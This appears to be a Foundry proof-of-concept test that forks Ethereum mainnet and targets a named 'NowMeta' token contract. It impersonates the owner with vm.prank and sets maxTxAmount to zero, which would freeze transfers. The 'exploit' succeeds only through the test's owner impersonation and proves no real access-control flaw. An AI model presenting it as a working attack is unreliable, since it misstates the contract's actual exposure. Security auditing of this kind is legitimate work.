// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INowMeta {
    function owner() external view returns (address);
    function setMaxTxAmount(uint256 amount) external;
    function maxTxAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xfac45d4b406D94cddFC48b198839673351CB2Bf9;
    address attacker = address(this);
    INowMeta nowMeta;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Fork mainnet at a recent block
        vm.createSelectFork(vm.rpcUrl("mainnet"), 20000000);

        // Create interface for NowMeta
        nowMeta = INowMeta(TARGET);

        // Get the current owner
        owner = nowMeta.owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "NowMeta Contract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Impersonate the owner and set maxTxAmount to 0
        vm.prank(owner);
        nowMeta.setMaxTxAmount(0);

        // Verify the exploit worked
        uint256 newMaxTxAmount = nowMeta.maxTxAmount();
        assertEq(newMaxTxAmount, 0, "maxTxAmount should be 0 after exploit");
        assertEq(newMaxTxAmount, 0, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

